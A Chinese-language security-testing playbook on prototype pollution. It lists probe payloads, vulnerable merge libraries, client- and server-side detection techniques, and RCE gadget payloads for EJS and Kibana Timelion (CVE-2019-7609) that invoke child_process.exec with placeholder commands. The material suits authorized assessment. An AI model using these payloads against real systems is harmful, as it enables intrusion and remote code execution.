---
id: prototype-pollution
title: 原型链污染手册（客户端/服务端 + gadget 链）
tags: prototype,原型链,pollution,nodejs,s4
---
# 原型链污染手册

> 判据=「污染后行为改变」（无害属性如 `__proto__.probe="x"` 触发可观察差异）；gadget→RCE 候选转 S5。

## 一、探测载荷（JSON 体/查询串/嵌套）

```json
{"__proto__":{"probe":"x"}}
{"constructor":{"prototype":{"probe":"x"}}}
{"__proto__":{"__proto__":{"probe":"x"}}}
# 查询串形态：?__proto__[probe]=x  ?constructor[prototype][probe]=x
# 表单嵌套：qs/express-lodash 路径风格差异逐一试
```

- 回读判据：**新对象**上出现 probe 属性（API 响应含 {} 序列化、新 session、错误对象含 probe）。
- 服务端确认：`process.env` 可污染类 gadget（`NODE_OPTIONS`/`shell`）→ RCE 候选，**判据只做 `__proto__.shell` 探针存在性，执行转 S5**。

## 二、高危 sink 点位（入口优先级）

- merge/assign 库版本（lodash <4.17.19、jQuery.extend deep、hoek、merge-obj）→ frontend-sca 先对版本。
- 配置类接口（偏好设置/主题/通知配置 JSON）——`__proto__` 常被服务端白名单滤，试 `constructor.prototype` 变体。
- GraphQL 自定义标量/嵌套 input；WebSocket 消息体；文件上传的 JSON 元数据。

## 三、客户端污染（前端）

- hash 参数 → 客户端 merge → 污染 Object.prototype → gadget（如 `__proto__.src` 注入脚本位判据）。
- 判据落地：污染后触发 `Object.keys` 全局可见差异（console 面板/探针 DOM 属性）。

## 四、登记

- 确证 → record_finding（cwe-1321）；无 gadget 时按「污染可达但无危害链」中低危如实定级（防夸大纪律）。

## 服务端污染探测与 gadget

- **qs 服务端全局副作用探测表**：`{"__proto__":{"parameterLimit":1}}`（多参数失效）、`{"json spaces":" "}`（响应多空格）、`{"status":510}`、`{"exposedHeaders":["foo"]}`——发污染请求后发干净请求看是否持久（判定服务端污染 vs 客户端）
- **EJS gadget**：`{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('...')"}}`
- **child_process 选项污染**：shell/argv0/env/NODE_OPTIONS
- **constructor.prototype 双线**：绕仅过滤 `__proto__` 的弱校验
- 工具：pp-finder、PPScan、BlackFan client-side 案例库

### 补遗

qs 探测表补两行：`{"__proto__":{"ignoreQueryPrefix":true}}`（`??foo=bar` 双问号前缀生效）；`{"__proto__":{"allowDots":true}}`（`?foo.bar=baz` 点号展开生效）。Timelion 表达式链 gadget：`.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("COMMAND")')`（CVE-2019-7609）。工具补：yuske/server-side-prototype-pollution、portswigger/server-side-prototype-pollution。